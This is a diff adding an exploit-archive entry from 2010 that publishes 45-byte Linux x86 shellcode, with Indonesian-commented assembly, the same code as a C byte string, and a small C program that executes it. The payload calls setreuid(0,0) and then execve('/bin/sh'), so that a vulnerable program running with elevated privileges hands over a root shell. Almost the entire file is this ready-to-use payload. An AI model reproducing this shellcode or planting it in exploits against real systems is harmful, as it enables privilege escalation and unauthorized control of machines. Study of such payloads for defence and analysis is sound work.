@@ -1,0 +1,106 @@
+id: 12750
+date: 06/17/2010
+title: linux/x86 execute /bin/sh with setreuid 0,0 45 Bytes
+author: gunslinger_
+cves: 
+
+====================================================
+linux/x86 execute /bin/sh with setreuid 0,0 45 Bytes
+====================================================
+
+
+/*
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : Inj3ct0r.com                                  0
+1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
+0                                                                      0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+Title  : execute /bin/sh with setreuid 0,0
+Name   : 45 bytes sys_setreuid (0,0) - sys_execve("/bin/sh","","")
+Date   : Thu Jun 17 16:58:40 2010
+Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
+Web    : http://devilzc0de.org
+blog   : http://gunslingerc0de.wordpress.com
+tested on : linux debian
+special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
+greetz : jasakom.com , devilzc0de.org - com , xc0de.or.id, yogyacarderlink.web.id, serverisdown.org
+tested on : linux debian
+---------------------------Original assembly-----------------------------
+global _start
+
+_start:
+	xor eax, eax	; bersihkan register!
+	xor edx, edx	;
+	xor ebx, ebx	;
+	xor ecx, ecx	;
+	
+        mov al, 70     	; sys_setreuid()
+        add bl,1        ; tambah 1 register bl menjadi 1 -> sys_setreuid(1,)
+        dec bl     	; kurangi 1 register bl menjadi 0 -> sys_setreuid(0,)
+	mov cl,bl	; kopikan nilai register bl ke cl. nilai register cl menjadi 0  -> sys_setreuid(0,0)
+        int 0x80	; interupsi kernel kerjakan !
+
+        jmp short end	; loncat tanpa kondisi ke end >-------------------------------------------------------------------.
+			;												  |
+	start:		; start terpanggil <--------------------------------------------------------------------------.	  |
+	mov al,11	; syscall nomer 11 execve 								      |	  |				;syscall sys_execve(args1,args2,args3)
+	pop ebx		; ambil dari stack <-------------------------------------------------------------------------------------------------------.	;sys_execve ("/bin/sh"
+	mov ecx, edx	; nilai register edx kosong, lalu kopikan ke register ecx jadi ecx kosong	              |   |			   |	;sys_execve ("/bin/sh",0,0)
+	int 0x80	; interupsi kernel, kerjakan !					                              |	  |			   |	;
+			;             									              |   |			   |
+	xor eax, eax	; bersihkan register ecx								      |   |			   |	;syscall exit()
+	inc eax		; increment eax, atau tambah eax 1 karena nilai eax 0 jadi eax menjadi 1 syscall nomer 1 exit |	  |			   |	;sys_exit()
+	int 0x80	; interupsi kernel, kerjakan !								      |	  |			   |	;
+			;											      |	  |			   |
+	end:		; label start <-----------------------------------------------------------------------------------' 			   |
+	call start	; panggil start >-----------------------------------------------------------------------------'          		   |
+	db '/bin/sh'	; masukan string '/bin/sh' ke stack >--------------------------------------------------------------------------------------'
+
+------------------------Eof Original assembly-----------------------------
+*/
+#include <stdio.h>
+
+char *shellcode=
+		"\x31\xc0"                    /* xor    %eax,%eax */
+		"\x31\xd2"                    /* xor    %edx,%edx */
+		"\x31\xdb"                    /* xor    %ebx,%ebx */
+		"\x31\xc9"                    /* xor    %ecx,%ecx */
+		"\xb0\x46"                    /* mov    $0x46,%al */
+		"\x80\xc3\x01"                /* add    $0x1,%bl */
+		"\xfe\xcb"                    /* dec    %bl */
+		"\x88\xd9"                    /* mov    %bl,%cl */
+		"\xcd\x80"                    /* int    $0x80 */
+		"\xeb\x0c"                    /* jmp    0x8048081 */
+		"\xb0\x0b"                    /* mov    $0xb,%al */
+		"\x5b"                        /* pop    %ebx */
+		"\x89\xd1"                    /* mov    %edx,%ecx */
+		"\xcd\x80"                    /* int    $0x80 */
+		"\x31\xc0"                    /* xor    %eax,%eax */
+		"\x40"                        /* inc    %eax */
+		"\xcd\x80"                    /* int    $0x80 */
+		"\xe8\xef\xff\xff\xff"        /* call   0x8048075 */
+		"\x2f"                        /* das     */
+		"\x62\x69\x6e"                /* bound  %ebp,0x6e(%ecx) */
+		"\x2f"                        /* das     */
+		"\x73\x68";                   /* jae    0x80480f5 */
+
+int main(void)
+{
+		fprintf(stdout,"Length: %d\n",strlen(shellcode));
+		((void (*)(void)) shellcode)();
+		return 0;
+}
+
+
+
+#  0day.today [2023-03-25]  #
